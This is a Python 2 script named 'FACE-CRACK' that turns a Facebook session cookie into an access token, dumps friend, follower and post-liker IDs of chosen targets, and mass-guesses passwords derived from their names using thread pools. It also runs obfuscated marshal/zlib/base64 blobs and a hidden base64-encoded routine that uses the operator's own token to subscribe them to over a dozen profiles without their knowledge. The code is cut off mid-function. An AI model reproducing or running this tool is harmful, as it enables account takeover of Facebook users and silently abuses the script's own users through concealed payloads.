#!/usr/bin/python2
# coding=utf-8
# open source code program

Hj = '\x1b[1;92m' 
Mt = '\x1b[0m' 
ingfo = (
"""%s
[ Ingpormasih Script ]

[•] Author      : Moch  Aang Ardiansyah-XD
[•] Facebook    : Https://www.facebook.com/Aang.XD404
[•] WhatsApp   : +6289524163441
[•] Github      : Github.com/AngCyber
[•] Script name : F A C E - C R A C K
[•] Version     : 2.0.4
 
%s"""%(Hj,Mt))
import os
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import concurrent.futures
except ImportError:
    os.system('pip2 install futures')
try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')
import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64
from concurrent.futures import ThreadPoolExecutor 
from bs4 import BeautifulSoup as parser
from time import sleep as jeda
from datetime import datetime
_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', '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', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'enc_lam.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[0;32m' # HIJAU
K = '\x1b[0;33m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  Moch Aang Ardiansyah-XD. #
#----------------------------------------------->
user, mi, status_foll, cr, ok, cp, id, user, loop, looping = [], [], [], [], [], [], [], [], 0, 1
sys.stdout.write('\x1b[1;35m\x1b]2;@𝐌𝐨𝐜𝐡 𝐀𝐚𝐧𝐠 𝐀𝐫𝐝𝐢𝐚𝐧𝐬𝐲𝐚𝐡 𝐗𝐃\x07')
sys.stdout.write('\x1b[1;37mMoch Aang Ardiansyah XD - Already up to date.\n');jeda(2)
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush();jeda(0.03)
def tik():
    titik = ['.   ','..  ','... ']
    for o in titik:
        print ('\r%s[%s] Sabar kentod, sedang hapus token %s'%(P,til,o)),
        sys.stdout.flush();jeda(1)
def folder():
	try:os.mkdir('hasil')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:
		ua_ = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
		open("data/ua.txt","w").write(ua_)
	except:
		pass
# LOGO (LO GOBLOK)
IP = requests.get("https://api.ipify.org/").text
def banner():
	print("""\x1b[0;91m _____               ____                _
\x1b[0;91m|  ___|_ _  ___ ___ / ___|_ __ __ _  ___| | __ ------>
\x1b[0;91m| |_ / _` |/ __/ _ \ |   | '__/ _` |/ __| |/ / ------>
\x1b[0;97m|  _| (_| | (_|  __/ |___| | | (_| | (__|   <  ------>
\x1b[0;97m|_|  \__,_|\___\___|\____|_|  \__,_|\___|_|\_\\ ------>
\x1b[0;93m[\x1b[0;92m#\x1b[0;93m]\x1b[0;95m--------------------------------------------------\x1b[0;93m>
\x1b[0;93m[\x1b[0;97m+\x1b[0;93m] \x1b[0;97mCode by   : \x1b[0;97mMoch Aang-XD \x1b[0;92m& \x1b[0;97mJeeck X Nano
\x1b[0;93m[\x1b[0;97m+\x1b[0;93m] \x1b[0;97mGithub    : Github.com/AngCyber
\x1b[0;93m[\x1b[0;97m+\x1b[0;93m] \x1b[0;97mFacebook  : Facebook.com/Aang.XD404
\x1b[0;93m[\x1b[0;92m#\x1b[0;93m]\x1b[0;95m--------------------------------------------------\x1b[0;93m>""")
# MASUK TOKEN (TOKEN LISTRIK)
header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
def masuk():
    os.system('clear');banner()
    jalan('\n%s[1] Login dengan cookie \n[2] Cara mendapatkan token facebook \n[3] Info autor & yang ingin memberi donasi \n[%s0%s] Keluar (%slogout dari script%s)'%(P,M,P,H,P))
    __Kontol__Jimin__Buriq__ = raw_input('\n%s[%s?%s] Pilih : %s'%(P,K,P,H))
    if __Kontol__Jimin__Buriq__ in(""):
    	print("%s[•] Isi yang benar kentod"%(M));exit()
    elif __Kontol__Jimin__Buriq__ in ('1','01'):
        jalan("\n%s[%s!%s] Ingat, Harus Pakai Akun Tumbal !!"%(P,K,P))
    	__Aang__Sayang__Laura__ = raw_input('%s[%s?%s] Malak Cookie :  %s'%(P,K,P,H))
        if __Aang__Sayang__Laura__ in(""):
        	print("%s[•] Isi yang benar kentod"%(M));exit()
        url = "https://business.facebook.com/business_locations"
        head = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
        cok = {'cookie':__Aang__Sayang__Laura__}
    	try:
            data = requests.get(url,headers=head,cookies=cok)
            token = re.search('(EAAG\w+)',data.text).group(1)
            open('token.txt','w').write(token)
            open('cookie.txt', 'w').write(__Aang__Sayang__Laura__)
            print ('\n%s[%s✓%s] Login Berhasil, Mohon Tunggu...'%(P,H,P));jeda(1)
            menu()
        except (KeyError,IOError):
        	print("%s[%s!%s] Token invalid tod !"%(P,M,P));masuk()
    elif __Kontol__Jimin__Buriq__ in ('2', '02'):
    	os.system('xdg-open https://youtu.be/iDVCcnLcTnE')
    elif __Kontol__Jimin__Buriq__ in ('3', '03'):
    	jalan("\n%s %s Author & Team project %sXNXCODE :\n"%(P,til,O));jeda(1)
        print(" \x1b[1;97m---> \x1b[1;96mAuthor :");jeda(1)
        jalan("%s • Moch Aang Ardiansyah-XD"%(H))
        jalan("%s • Jeeck X Nano\n"%(H))
        print("%s ---> Team project %sXNXCODE :"%(P,O));jeda(1)
        jalan("%s • Ndrii Sans Yumasaa"%(H))
        jalan("%s • Aldi Bachtiar Rifai"%(H))
        jalan("%s • Najib XD.\n"%(H))
        print("%s ---> Bagi Yang Ingin Memberikan Donasi :"%(P));jeda(1)
        jalan("%s • Dana  : %s083806858479"%(H,O))
        jalan("%s • Pulsa : %s081392979518\n"%(H,O))
        jalan("%s • Terimakasih Atas Dukungan Anda : %sAang-XD"%(H,K))
        raw_input('%s[%s!%s] Tekan enter '%(P,H,P));menu()
exec(base64.b64decode('ZGVmIGxvZ2luX3h4KCk6CiAgICB0cnk6CiAgICAgICAgdG9rZW4gPSBvcGVuKCJkYXRhL3Rva2VuLnR4dCIsInIiKS5yZWFkKCkgCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDIyMDg2MTcyNTU2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBGYW5zcGFnZSBSb21pIFhECiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI4NDM0ODgwNTI5L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNjc4MDc1NjU4NjEvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIFJvbWkgQWZyaXphbCAoMjAyMSkKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDM3MjM2OTY4ODUvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIElxYmFsIGJvYnoKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNDExMjkwNDg5NDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEl3YW4gaGFkaWFuc3lhaAogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwNzUyMDIwMzQ1Mi9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgSGFtemFoIGtpcmFuYQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwMjQ2MTM0NDE3OC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVW5payBST01JIEFGUklaQUwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNzE3NDc0MjA1ODMvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIERvbmlmdGZhbm55CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI5MTQzMTExNTY3L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBEZW1pdCBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDE1NDAyOTkxMDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEhha2lraQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDA1NTkxODM5MTI4MC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVGlhcmEgYXJ0CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDA5Mzg0MzM4NDcwL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBJd2FuIGhhbmRpYW5zeWFoIHYyCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDM2NjU1MzI1OTk2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBBYnVzdG8gSmF2YQogICAgZXhjZXB0OgogICAgCXBhc3M='))
_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', 'eJylVVtPE0EUPtvSFlBRwBuJD4OJpr7Qdi/t1ggo4oNBILESjcaY6c7QLnt1Z1ZtYp/wR/jmX/QneGYBKZsWJexkJjPnu8yZ3dkZB44fDetTrGIOGwbwA+A9djTozFQLGHIUaRprGetzRdzD8GAJZMZiBTgswIEGhwBDgLfhA5iSBZBF2C+ANwvJU9A0TU4BK4Iswe1DDbRQg3dsCoaoLsGwAKwMwyKwCgyRNg3DErAZGJaBzcKwArIMBxVgV+A7wB0lPw5czQeu5QNz+cD1fOBGPjCfBdgC3MkBi5MAVGiTFOOBm/lJb43JojDJszgpi6lJivEAKkqTFOMBVJQnKcYDqKhMUuQA3Hmd6m3cXjtiBlsZeTxckd+kVPszEUvYkgfiw/JHkkHEo4z66VeaCLos7iK6QcMe6aWU7NNQED8lodsnj7+si0cIdngQ9SjxkdPjyBtQ0lX8Z6oRNKCkQ4XnDqi4p6xcEbi+T/sKijmJuU8DN6Qh+on7SNhjtK/gbUyBbLq+S6UbogX67CZoiTTls+NKNyZvsnw3kUMF2TiZNVvR8aTEoaF0PRKnIQ4y9LpKY8CJ4JwMovT3r58/xSbG+lLG4nGt1kto3F/Zpw7vRpG34kRBrVHHp9HUG5Zt1u1GTaRd4SRulydinToOF+JT9upW/8dIb7XaTcvU2w37kkZGo23VzbpltC9n1MR1tSy7Yer65Ywsw2zW66ZtGJd8R3VDt3Rcl25Y5xitnW9k6brebLRMwzSbdls3axgMeChFbT1AF9rjq9nJ/PCs6+r5rm271bT1etO2DQu/wTjTVxfMy3c9LtZFGgQ0GazKJOW5lLYultK//KrqzsF7AyCKMXXVSThlUoW3+OBFkkSJrODg5e5RXzH4N/foxNjOeAn/nHIhRYbFkZBHpqWTAyYjeRG+mk9eOjIIUjl7iriSjmB+Kmf+DvB/HRkx/MdPdeocqqrLM2uyj1gTzKEJq3UjuRIP8I4EwK7KV2xkd3FRW9IWtQWtfKbMj5Sl4zLaPy07VWX2ev5k1vPnV4t6EkQs9fma0klF/AMUwvQ8', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'lambda.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
# DUMP PUBLIK
def publik(romz,cookie,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s[%s+%s] Ketik %sme%s untuk dump id teman !"%(P,K,P,H,P))
        idt = raw_input('[?] Target id   : %s'%(H))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz),cookies=cookie)
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s'%(idt,romz),cookies=cookie)
        z = json.loads(r.text)
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s[+] Proses dump :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0040)
        bff.close()
        print ('\n \n%s[%s✓%s] Succes dump id dari %s%s'%(P,H,P,H,nm['name']))
        print ('%s[%s•%s] Copy file dump nya :%s %s '%(P,H,P,H,file))
        raw_input('\n%s[+] %Tekan enter %s '%(P,K,P))
        menu()
    except Exception as e:
        exit('\n%s[%s!%s] Ketik ulang python2 face.py'%(P,K,P))
# DUMP FOLLOWERS
def followers(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s[%s+%s] Ketik %sme%s jika ingin dump followers sendiri "%(P,K,P,H,P))
        idt = raw_input('[?] Target id   : %s'%(K))
        batas = raw_input('%s[?] Limit id    : %s'%(P,K))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(idt,batas,romz))
        z = json.loads(r.text)
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s[+] Proses dump :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0040)
        bff.close()
        print ('\n\n%s[%s✓%s] Succes dump id dari %s%s'%(P,H,P,H,nm['name']))
        print ('%s[%s+%s] Copyfile dump nya :%s %s '%(P,H,P,H,file))
        raw_input('\n%s[+] %sTekan enter %s '%(P,K,P))
        menu()
    except Exception as e:
        exit('\n%s[%s!%s] Ketik ulang : python2 face.py'%(P,K,P))
# DUMP POSTINGAN 
def postingan(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s[%s!%s] Perlu di ingat, postingan wajib publik ! "%(P,M,P))
        idt = raw_input('[?] Id postingan   : %s'%(K))
        simpan = raw_input('%s[?] Nama file : %s'%(P,K))
        r = requests.get('https://graph.facebook.com/%s/likes?limit=999999&access_token=%s'%(idt,romz))
        id = []
        z = json.loads(r.text)
        file = ('dump/' + simpan + '.json').replace(' ', '_')
        bff = open(file, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s[•] Sedang dump id :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0040)
        bff.close()
        print ('\n\n%s[%s✓%s] Succes dump id postingan '%(P,H,P))
        print ('%s[%s+%s] Copy file dump nya :%s %s '%(P,H,P,H,file))
        raw_input('\n%s[+] %sEnter %s '%(P,K,P))
        menu()
    except Exception as e:
        exit('\n%s[%s!%s] Ketik ulang : python2 face.py'%(P,K,P))
   
# START CRACK
class ngentod:
	
    def __init__(self):
        self.id = []
    def mantan(self):
        try:
            self.apk = raw_input('\n%s[?] File dump :%s '%(P,K))
            self.id = open(self.apk).read().splitlines()
            print '%s[%s+%s] Total id  : %s%s' %(P,K,P,H,len(self.id))
        except:
            print '\n%s[%s!%s] File dump ndak ada, dump id dulu lah kentod'%(P,M,P)
            raw_input('\n%s[•] %sEnter %s '%(P,K,P));menu()
        aangxd = raw_input('%s[?] Ingin gunakan password manual? (d/m):%s '%(P,K))
        if aangxd in ('01','1','M', 'm'):
            print '%s[%s!%s] Gunakan (koma) untuk tanda pemisah sandi'%(P,M,P,H,P)
            while True:
                pwx = raw_input('%s[?] Kata sandi :%s '%(P,K))
                if pwx == '':
                    print '\n%s[!] jangan kosong kentod'%(M)
                elif len(pwx)<=5:
                    print '\n%s[!] password minimal 6 karakter'%(M)
                else:
                    def zona(zafi_=None): 
                        ind = raw_input('\n%s[?] Metode : %s'%(P,K))
                        if ind == '':
                            print("%s[•] Isi yang benar kentod "%(M));self.zona()
                        elif ind in ('1', '01'):
                            print '\n%s[%s•%s] Akun %sOK%s saved >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta)
                            print '%s[%s•%s] Akun %sCP %ssaved > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta)
                            print '%s[%s!%s] Mode pesawatkan (3 detik) setiap 3 menit !!\n'%(P,H,P)
                            with ThreadPoolExecutor(max_workers=20) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.b_api, user, zona)
                                    except: pass
                            os.remove(self.apk);exit()
                        elif ind in ('2', '02'):
                            print '\n%s[%s•%s] Akun %sOK%s saved >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta)
                            print '%s[%s•%s] Akun %sCP %ssaved > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta)
                            print '%s[%s!%s] Mode pesawatkan (3 detik) setiap 3 menit !!\n'%(P,H,P)
                            with ThreadPoolExecutor(max_workers=20) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.b_api, user, zona)
                                    except: pass
                            os.remove(self.apk);exit()
                        elif ind in ('3', '03'):
                            print '\n%s[%s•%s] Akun %sOK%s saved >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta)
                            print '%s[%s•%s] Akun %sCP %ssaved > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta)
                            print '%s[%s!%s] Mode pesawatkan (3 detik) setiap 3 menit !!\n'%(P,H,P)
                            with ThreadPoolExecutor(max_workers=20) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.mobile, user, zona)
                                    except: pass
                            os.remove(self.apk);exit()
                        else:
                            print ('\n %s[•] isi yang benar kentod'%(M));zona()
                    print '\n%s[ \x1b[0;33mSilahkan pilih metode untuk login \x1b[0;97m]\n'%(P)
                    print '\x1b[0;97m[%s1%s] Metode B-Api \x1b[0;35m---> \x1b[0;32mCrack cepat & rawan spam'%(K,P);jeda(0.3)
                    print '\x1b[0;97m[%s2%s] Metode Basic \x1b[0;35m---> \x1b[0;32mMode crack lambat'%(K,P);jeda(0.3)
                    print '\x1b[0;97m[%s3%s] Metode Mobile \x1b[0;35m--->\x1b[0;32mIni lambat bego'%(K,P);jeda(0.3)
                    zona(pwx.split(','))
                    break
        elif aangxd in ('02','2','D', 'd'):
            print '\n%s[ \x1b[0;33mSilahkan pilih metode untuk login \x1b[0;97m]\n'%(P)
            print '\x1b[0;97m[%s1%s] Metode B-Api \x1b[0;35m---> \x1b[0;32mCrack cepat & rawan spam'%(K,P);jeda(0.1)
            print '\x1b[0;97m[%s2%s] Metode Basic \x1b[0;35m---> \x1b[0;32mMode crack lambat'%(K,P);jeda(0.1)
            print '\x1b[0;97m[%s3%s] Metode Mobile \x1b[0;35m--> \x1b[0;32mCrack sangat lambat '%(K,P);jeda(0.1)
            self.langsung()
        else:
            print("%s[•] Isi yang benar kentod"%(M));jeda(2);menu()
    def langsung(self):
        __Aang__Sayang__Laura__ = raw_input('\n%s[%s?%s] Metode :%s '%(P,K,P,H))
        if __Aang__Sayang__Laura__ == '':
            print("%s[•] Isi yang benar kentod"%(M));self.langsung()
        elif __Aang__Sayang__Laura__ in ('1', '01'):
            print '\n%s[%s•%s] Akun %sOK%s saved >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta)
            print '%s[%s•%s] Akun %sCP %ssaved > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta)
            print '%s[%s!%s] Mode pesawatkan (3 detik) setiap 3 menit !!\n'%(P,H,P)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.b_api, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        elif __Aang__Sayang__Laura__ in ('2', '02'):
            print '\n%s[%s•%s] Akun %sOK%s saved >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta)
            print '%s[%s•%s] Akun %sCP %ssaved > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta)
            print '%s[%s!%s] Mode pesawatkan (3 detik) setiap 3 menit !!\n'%(P,H,P)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        xz= name.split(' ')
                        pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"1234", xz[0]+"12345"]
                        log.submit(self.basic, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        elif __Aang__Sayang__Laura__ in ('3', '03'):
            print '\n%s[%s•%s] Akun %sOK%s saved >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta)
            print '%s[%s•%s] Akun %sCP %ssaved > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta)
            print '%s[%s!%s] Mode pesawatkan (3 detik) setiap 3 menit !!\n'%(P,H,P)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.mobile, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        else:
            print("\n%s[•] Isi yang benar kentod"%(M));self.langsung()
    def b_api(self, user, zona):
    	try:
